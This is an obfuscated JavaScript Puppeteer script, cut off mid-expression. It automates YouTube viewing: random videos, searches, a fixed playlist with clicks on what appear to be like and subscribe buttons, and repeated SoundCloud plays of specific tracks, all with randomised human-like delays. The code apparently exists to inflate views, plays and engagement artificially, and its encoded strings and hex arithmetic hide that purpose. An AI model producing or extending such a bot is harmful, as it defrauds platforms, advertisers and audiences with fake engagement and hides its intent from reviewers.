const Z = b,
  Y = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x190b + 0x1131 + -0x2a3b))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x164e * -0x1 + 0x1c45 * 0x1 + 0x79 * -0x6b), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  const R = b;
  return await f[R(0x6, 'HSy5')](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0xc707 + -0x149 * -0x56 + -0xb * -0x12b3 + (-0x5c17 + 0x3752 + -0x1 * -0x5f5d) * random()) : await standardWaitForNetIdle(f), await wait(-0x1d99 + -0x1e * 0x3 + -0xef * -0x35 + (0x2 * 0x1a92 + -0x255 + -0xbbf) * random()), 0x4 * -0x2c6 + -0x176d * 0x1 + 0x2286;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x28a + -0xa4a + -0x6 * -0x48c), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1ce7 + 0xfcd + -0x2cb3;
}
async function randomWait() {
  return await wait(0x24cc + -0x1 * 0x230c + 0x11c8 + (-0x1275 + -0x8f5 + -0x1 * -0x2ef2) * random()), 0x2 * 0x55d + -0x4f5 + -0x5c4;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const S = d;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + S(0xe) + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x2117 + 0x1b81 + 0x2 * -0x1e4c, -0x2659 * 0x1 + 0x4b8 * 0x2 + 0x10 * 0x1cf), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0xfb * -0xb0 + 0x19e3 + 0x17d0d) * getRandomInt(-0x1 * -0x10d3 + -0x124a * 0x2 + 0x13c3, -0x162 + -0x7d * -0x22 + -0xf33 * 0x1), h)), 0x1 * -0x15e9 + 0x7 * -0x4bb + 0x3707;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x166 * -0x1 + -0x41f * -0x5 + -0x1601);
    let h = e[f];
    if (b['PUGqsF'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x15b9 * -0x1 + 0x22db + -0x3894, s, t, u = 0x1986 + 0x17c0 + 0x173 * -0x22; t = n['charAt'](u++); ~t && (s = r % (0x1131 + -0x152b + 0x92 * 0x7) ? s * (0x48d * 0x1 + 0x1159 * -0x2 + 0x1e65) + t : t, r++ % (-0x106 * -0x12 + -0xb * 0x2fb + 0xe61)) ? p += String['fromCharCode'](0x1271 + -0x1 * 0x1a9d + 0x92b & s >> (-(-0x1e * 0x3 + -0x1a * 0x6 + -0x1 * -0xf8) * r & 0x22e4 + 0x4a5 + -0x2783)) : 0x3 * -0x7cf + 0xdac + 0x9c1) {
          t = o['indexOf'](t);
        }
        for (let v = 0x28a + -0xa4a + -0x4 * -0x1f0, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1ce7 + 0xfcd + -0x2ca4))['slice'](-(0x24cc + -0x1 * 0x230c + -0x1be));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1275 + -0x8f5 + -0x1 * -0x1b6a,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x2 * 0x55d + -0x4f5 + -0x5c5; u < 0x2117 + 0x1b81 + 0x1 * -0x3b98; u++) {
          p[u] = u;
        }
        for (u = -0x2659 * 0x1 + 0x4b8 * 0x2 + 0x3 * 0x9a3; u < 0x107 * -0xe + 0x228 + 0xd3a; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1 * -0x10d3 + -0x124a * 0x2 + 0x14c1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x162 + -0x7d * -0x22 + -0xf38 * 0x1, q = 0x1 * -0x15e9 + 0x7 * -0x4bb + 0x3706;
        for (let v = -0x7 * 0x2e5 + -0x1afe + 0x1 * 0x2f41; v < n['length']; v++) {
          u = (u + (-0x1c15 + 0x20 * -0xd + 0x1db6)) % (0x1246 + -0x188a + -0xa * -0xba), q = (q + p[u]) % (0x25dc + 0x2455 + 0x4931 * -0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x209c + 0x19e8 + 0x44 * 0x1d)]);
        }
        return t;
      };
      b['hWTEiL'] = m, c = arguments, b['PUGqsF'] = !![];
    }
    const j = e[0x15b1 + -0x16 * 0x19d + -0xdcd * -0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['tSDaHv'] === undefined && (b['tSDaHv'] = !![]), h = b['hWTEiL'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const T = b,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))[T(0x1, 'ldV4')]()['ariaValueT' + 'ext'],
      j = -0x7 * 0x2e5 + -0x1afe + 0x1 * 0x2f41;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1c15 + 0x20 * -0xd + 0x1db6]['split']('\x20');
    for (let k = 0x1246 + -0x188a + -0x2 * -0x322; k < i['length']; k += 0x25dc + 0x2455 + 0x4a2f * -0x1)
      j += i[k] * h[i[k + (-0x209c + 0x19e8 + 0x65 * 0x11)]];
    return j;
  });
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x166 * -0x1 + -0x41f * -0x5 + -0x1601);
    let h = e[f];
    if (c['DYeooH'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x15b9 * -0x1 + 0x22db + -0x3894, r, s, t = 0x1986 + 0x17c0 + 0x173 * -0x22; s = m['charAt'](t++); ~s && (r = q % (0x1131 + -0x152b + 0x92 * 0x7) ? r * (0x48d * 0x1 + 0x1159 * -0x2 + 0x1e65) + s : s, q++ % (-0x106 * -0x12 + -0xb * 0x2fb + 0xe61)) ? o += String['fromCharCode'](0x1271 + -0x1 * 0x1a9d + 0x92b & r >> (-(-0x1e * 0x3 + -0x1a * 0x6 + -0x1 * -0xf8) * q & 0x22e4 + 0x4a5 + -0x2783)) : 0x3 * -0x7cf + 0xdac + 0x9c1) {
          s = n['indexOf'](s);
        }
        for (let u = 0x28a + -0xa4a + -0x4 * -0x1f0, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1ce7 + 0xfcd + -0x2ca4))['slice'](-(0x24cc + -0x1 * 0x230c + -0x1be));
        }
        return decodeURIComponent(p);
      };
      c['kCZtSK'] = i, b = arguments, c['DYeooH'] = !![];
    }
    const j = e[-0x1275 + -0x8f5 + -0x1 * -0x1b6a],
      k = f + j,
      l = b[k];
    return !l ? (h = c['kCZtSK'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function anchorAndView(f) {
  const U = d;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click'](U(0x0) + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const V = b,
      j = Array['from'](document['querySelec' + 'torAll'](V(0x11, 'OJgE')))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l[V(0x15, 'J%yE') + 'te']('class'))['slice'](0x15b1 + -0x16 * 0x19d + -0xdd3 * -0x1)['map'](l => Array['from'](l['children']))['flat'](-0x19af + -0x23e4 * -0x1 + -0xa34)['map'](l => l['childNodes'][-0x1a2e + 0x1c83 + -0x254]['childNodes'][0x2b * -0x3 + 0x2e * 0x2e + 0x1 * -0x7c3]['childNodes'][-0x146f * -0x1 + -0x1 * 0x1aec + -0x2 * -0x33f]['childNodes'][-0x181 * -0x17 + -0x1 * -0x577 + 0x6ad * -0x6]['childNodes'][0x16e5 + 0x3 * 0x419 + -0x232f]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1 * 0xa7f + -0x85c + 0x16c3, -0x2 * -0xd8a + 0x2b * -0x8d + 0x1cb * 0x9)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x21d5 + 0x5c6c + 0x1 * -0x43a9);
  const h = await getMaxTime(f),
    i = Math['min']((0xe229 * -0x1 + -0x13b08 + 0x30791) * getRandomInt(0x768 + 0xf57 + -0x16bd, 0xa * -0x15a + -0x29 * -0x99 + -0x18 * 0x75), h);
  return await wait(i), 0x3d1 * 0x2 + -0x1b52 + 0x13b1;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1340 + -0x21a3 * -0x1 + 0x11a1 * -0x3]['children'][-0x22 * 0xa3 + 0x1 * 0x8 + 0xacf * 0x2]['children'][0xb * -0x16f + -0x1 * -0x251a + -0x1555]['children'][-0xda * 0x1b + 0x93f * 0x2 + 0x24 * 0x20]['children'][0x6b0 + 0x733 * 0x2 + -0x1516]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1435 + -0x1 * -0xca7 + -0xf * -0x81;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x9f5 + 0x233e + 0x2ccf * -0x1 + (0x171e + -0x21b0 + 0xac4) * random()
  }), await wait(-0x2404 + -0x5 * -0x76 + 0x6e * 0x53 + (-0xbe8 * -0x1 + -0x20eb + -0x9 * -0x277) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1 * 0x1e85 + -0x3 * 0x2c5 + 0x26d6]['childNodes'][0x1b4a + -0x3c + -0x1b0d]['childNodes'][0x3 * -0x49d + -0x254b * 0x1 + -0x2b1 * -0x13]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0xf2a + -0x5d9 * -0x3 + -0x82c * 0x4]['childNodes'][-0xd82 * 0x1 + 0x2 * -0xa9c + 0x22ba]['childNodes'][-0x2e * -0x1d + -0x27b * 0xd + 0x1b0b]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x45 * 0x2b + 0x2d1 * -0x5 + 0x19ad),
          r = 0x21a * 0x7 + 0x172e + -0x25e4;
        for (let u = 0x1ed6 * 0x1 + -0x13 * 0x76 + -0xc * 0x1d7; u < q['length']; u += 0x193 + 0x747 + -0x8d8)
          r += q[u] * k[q[u + (0x13 * -0xd + 0x1a3b + 0xdf * -0x1d)]];
        return r;
      }(n);
  });
  await wait((-0x1 * -0x4045 + -0xedc * 0x2 + 0x180b) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x83 * -0x3b + -0x1 * 0x11926 + -0xb * -0x2c1f) * getRandomInt(0x2c8 + -0x6b9 * 0x2 + 0xaab * 0x1, 0x1c04 + 0x29 * -0x4f + 0xf53 * -0x1), h + (-0x1b61 + -0x22b4 + 0x519d));
  return await wait(i), -0x1e7 * 0x1 + -0x141 * 0x1f + 0x28c7;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x17ab * -0x1 + -0x3a4 + 0x1b4f), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      const W = b;
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x12e5 + -0x2 * -0xdf2 + 0x2b9 + (-0x1 * 0x414 + -0x22a + -0x6 * -0x1b1) * Math[W(0x5, 'F*tt')]());
    });
  }, 0x2fc0 + 0x44f + -0x18b7);
  await wait(0x10bc5 * 0x1 + 0x1 * 0x44bbb + -0xc3a0);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x54cb * 0x1 + 0x659e + 0x2ff7) * getRandomInt(-0xfb7 + -0x218f + -0x106e * -0x3, 0x10c5 + -0x9f * 0x5 + 0xd91 * -0x1)), clearInterval(h), 0x1b6e + 0x1e0d + 0x41b * -0xe;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x1 * 0x3fb + -0x1ab * 0xb + 0xe5e;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x234a * 0x1 + 0x1e7e + -0x41c7 * 0x1;
    await randomWait();
  }
  return -0x5ad + 0x1ac2 + -0x1514;
}

function a() {
  const bn = [
    'tp-yt-pape',
    'hSoNW4i',
    'pts/by-sit',
    'Safari/537',
    'd3CRE9y3YV',
    'E1a9W7hdGSkv',
    'W4j2W6BdVG',
    '--no-sandb',
    'FmoOWPNcPXGa',
    'W6aTg8obsW',
    'rg/en/scri',
    'u8klhv3cGCkmFduCFG',
    'rNFLQFz_G1',
    'uMVcTetcPSkcdmo2',
    'ill-parent',
    'WPaei8oLWQdcQColW6xdVSor',
    'createInco',
    'WOauW5tdPZztW6asCW',
    'yCoaWPldUCo9CSoA',
    'WQlcTvS9la',
    't33cHNGGqG3dT2mm',
    'zfTSW5ZdQeb7fNrU'
  ];
  a = function() {
    return bn;
  };
  return a();
}

function fetchRandomSC() {
  return Math['random']() <= -0x1e4f * 0x1 + 0x1 * -0xee9 + 0x1 * 0x2d38 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0xd0a + 0x0 + 0x2 * 0x685 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1 * -0xc3a + 0x24 * -0xb + -0xaae + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x17c + 0x1143 + -0xfc7;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xa426 + -0xdf * 0x97 + 0x8f2b + getRandomInt(-0x28ea + -0x5 * 0x11f7 + -0xbd55 * -0x1, -0x26 * 0x4fe + -0x1ee * 0x3a + 0x1a2d0));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x680 + -0x3 * 0x8dd + 0x1418), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x33d * -0x5 + -0xbc2 + -0x9f * -0x2d;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x79f * -0x3 + 0x129f * 0x2 + -0xe61, -0x5b + 0x22 * -0x56 + -0x5 * -0x265)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x26b0 + -0x5e9 + -0x1 * -0x3469 + floor((-0x53f + 0x129 * 0x21 + -0x1d22) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x45f4618 * -0x2d + 0x1 * 0x6108d5bc + 0x6 * 0x25f3bf6a),
          0x5463fe + -0x7806b9 + 0xa3a2bb,
          -0xafde * 0x1 + -0x2 * -0xab2 + -0xede * -0x13,
          -0xb2 * 0x13 + -0x120e * 0x1 + 0x1fc4
        ], y = [
          0x53 * 0x2b + -0x17e9 + 0xe * 0xb8,
          -0x255 + 0x63e + -0x3d9,
          -0x112f * -0x1 + -0x1 * -0x179c + -0x28c3,
          -0x1 * -0x117b + 0x15f4 + -0x276f
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x13 * 0xa7 + -0xb * -0x125 + -0x31)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x1c48 + -0x6f * 0x33 + 0x3265; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1bfd * -0x1 + -0x19 * 0x157 + 0x3d7c) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x4e * -0x1d + -0x1f01 + 0x27d7] = A[-0x247 + 0xa1e + 0x7c7 * -0x1] = A[-0x6 * 0x15b + -0x249e + 0x2cc1] = A[-0x17b6 + 0x1 * 0x584 + -0xa * -0x1d2] = A[-0x1c9 * 0xd + 0x4f * -0x7a + 0x3cde] = A[-0x26cf * 0x1 + 0xab * -0x8 + 0x2c2b] = A[0x7 * -0x1f3 + -0x1a86 + 0x2830] = A[-0xb * 0x43 + -0x629 * 0x2 + 0xf39] = A[0x173 + 0x13b2 + -0x151e * 0x1] = A[-0x21 * 0x115 + -0xfca * 0x1 + 0x3387] = A[-0x95 * 0x16 + -0x327 * 0xc + 0x32ab] = A[-0x47a * 0x3 + -0x10e8 * 0x1 + 0x1e60] = A[-0x1c94 + -0x1d73 + 0x1 * 0x3a12] = A[0x215 * -0xd + -0x7d5 * 0x1 + 0xe * 0x27f] = A[-0x13 * -0x105 + -0x136b + 0x19] = A[0x35 * -0x18 + 0x1 * -0x1539 + 0x1a3f] = A[0x4 * 0x130 + 0x50d * 0x2 + -0xecb] = 0x1 * 0x10df + -0x1 * -0x916 + 0x1 * -0x19f5, this['blocks'] = A) : this['blocks'] = [
                -0x1948 * 0x1 + 0x1238 + 0x2 * 0x388,
                -0x1a09 + 0x2 * 0x7 + 0x3 * 0x8a9,
                0x5a * -0xf + 0x186d + 0x1 * -0x1327,
                -0x4b * -0x31 + 0x154f + -0x33e * 0xb,
                -0x153 * 0x9 + 0x97 * -0x37 + 0xb17 * 0x4,
                0x14b2 * 0x1 + 0xe * 0x292 + 0x38ae * -0x1,
                -0xa58 + -0x1578 + 0x1fd0,
                0x1f87 * 0x1 + -0xec1 * -0x2 + -0x1 * 0x3d09,
                0xead + 0x1683 + -0x2530,
                -0x1 * -0x256a + -0x71 * 0x1 + -0xc53 * 0x3,
                -0x20db * -0x1 + 0x3 * -0x71e + -0x5 * 0x24d,
                0xbf1 * -0x1 + -0x2085 + -0x163b * -0x2,
                -0x1b1 * -0xe + -0x1157 + -0x657,
                -0x152f * -0x1 + -0xcd6 + 0x859 * -0x1,
                -0x1efb + 0x23a9 + 0x4ae * -0x1,
                0x97b + 0x2 * -0xef5 + 0x1 * 0x146f,
                -0x1132 + 0x12 * 0x139 + -0x7 * 0xb0
              ], this['h0'] = -0x70cc53e8 + -0x15ba5 * 0x48f1 + 0x284aa * 0x7d23, this['h1'] = -0x617bc185 + 0x18816a655 + -0x427d3d * 0xd3, this['h2'] = 0x1e1 * -0x652ce5 + 0x30e2e6 * -0x3e5 + 0x21537e101, this['h3'] = 0xe71 * 0x1d95f + -0x17323582 * -0x1 + 0x1 * -0x21b405fb, this['h4'] = -0x940de860 + 0xf947eacb + 0x5e98df85, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0xeda + -0xb4 * 0x35 + -0x166a * -0x1, this['finalized'] = this['hashed'] = -0xbe * -0xd + -0x11cd + 0x827, this['first'] = 0xa * 0x35 + 0xe * -0x277 + -0x37 * -0x97;
            }
            ['update'](J) {
              const X = b;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x4 * 0x72d + -0x1c * 0x159 + 0x4 * 0x242, O = J[X(0x8, 'ZZ%5')] || 0x18f1 + 0x1 * 0x224b + -0x3b3c, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x12 * -0x1c1 + 0x262a + 0x116f * -0x4, P[-0x1a90 + 0x1b81 + -0xf1] = this['block'], P[0x7cc * -0x1 + 0xe * -0x1f6 + 0x710 * 0x5] = P[0x1 * 0x51a + -0x887 + 0x36e] = P[-0x2089 + 0x1 * -0xc9d + 0x44 * 0xaa] = P[0x2ae * 0x8 + -0xdca + 0x5 * -0x187] = P[-0x2194 + 0x2 * 0xabd + 0xc1e] = P[-0x22a8 * 0x1 + -0x986 + 0x2c33] = P[-0x239 * -0xc + 0x7 * 0x557 + -0x4007] = P[0xd49 + -0xd * -0x47 + -0x10dd] = P[0x2 * 0x9b8 + -0x1 * -0x23e9 + -0x3751] = P[-0x26ab + -0x1760 + 0x3e14] = P[-0x41 * 0x78 + -0x126c + 0x1 * 0x30ee] = P[-0x22 * 0x81 + -0x92c + 0x1a59] = P[0x190c * -0x1 + 0x2e4 + 0x1634] = P[0x4fd * 0x4 + 0x2047 + -0x2 * 0x1a17] = P[-0x6f4 + 0x2622 + -0x1f20] = P[0x16 * 0xfd + 0x195 + -0x1744] = 0x22 * 0x109 + -0x7 * 0x1e3 + -0x15fd), K) {
                    for (N = this['start']; M < O && N < 0x14e * -0xd + 0x10a * 0x2 + -0xd * -0x12a; ++M)
                      P[N >> 0x824 * -0x1 + -0xc6d * -0x3 + 0x1 * -0x1d21] |= J[M] << y[-0x92 * 0x3d + -0x2 * 0x96b + 0x255 * 0x17 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x3 * 0xbb7 + 0xc1d + -0x2f02; ++M)
                      (L = J['charCodeAt'](M)) < -0x5 * 0x28 + 0xaa * -0x35 + 0x247a ? P[N >> -0xa6b + -0x1e91 + -0xc6 * -0x35] |= L << y[0x1916 + 0x1b13 + -0xf * 0x37a & N++] : L < -0x6 * 0x6b + -0x184d + -0x4f9 * -0x7 ? (P[N >> -0x1141 + -0x28f * -0xe + 0x128f * -0x1] |= (-0x17aa * 0x1 + -0x1a22 + -0x2 * -0x1946 | L >> -0x1a * -0x7e + 0x3 * -0x22 + 0x108 * -0xc) << y[0x6e7 + -0x1 * 0x221f + 0x1b3b * 0x1 & N++], P[N >> 0x1119 * 0x1 + 0x3 * -0x983 + -0x5 * -0x24a] |= (-0x1 * -0x133a + -0x16 * -0x15 + 0x291 * -0x8 | -0x1a2c * -0x1 + 0x16b9 + -0x30a6 & L) << y[-0x734 + -0x1ce + 0x1 * 0x905 & N++]) : L < -0x1a766 + -0x122ed + 0x1 * 0x3a253 || L >= 0xc2 * 0x4e + -0x1 * 0x13bb + 0xb89f ? (P[N >> 0xf43 + 0x74f * -0x4 + 0xdfb] |= (-0xd91 + 0x1844 + -0x9d3 | L >> -0x41e + -0x1d47 * 0x1 + 0x2171) << y[-0x11 * 0x175 + 0x1b44 * -0x1 + 0x1 * 0x340c & N++], P[N >> -0x1 * -0x24c3 + -0x1 * 0x1436 + -0x108b] |= (-0xff3 + -0x1786 + -0x1 * -0x27f9 | L >> -0xace + 0x8ad * -0x3 + 0x24db & -0x1b1b + 0x19a5 + 0x1 * 0x1b5) << y[0x1f08 + 0x1b7c + 0x371 * -0x11 & N++], P[N >> -0x976 + 0x10da + -0x762] |= (0x2114 + -0xb1 * -0x1 + -0x2145 | -0xb3b + 0x1432 + 0x48 * -0x1f & L) << y[-0xc4b + 0x222a + -0x15dc & N++]) : (L = 0x7a07 + 0x1 * 0xa9e1 + -0x23e8 * 0x1 + ((-0x1cbd + -0x18eb + 0x39a7 & L) << -0x13b9 + -0x33 * 0x83 + 0x24b * 0x14 | -0x19 * 0x14b + -0x151 * -0x1d + 0x1db * -0x1 & J['charCodeAt'](++M)), P[N >> 0xdec + -0x1fa5 * 0x1 + 0x11bb] |= (0x1585 * -0x1 + 0x1 * 0x1c23 + -0x5ae | L >> -0x7a * 0x9 + 0x37 * 0x5c + -0x2 * 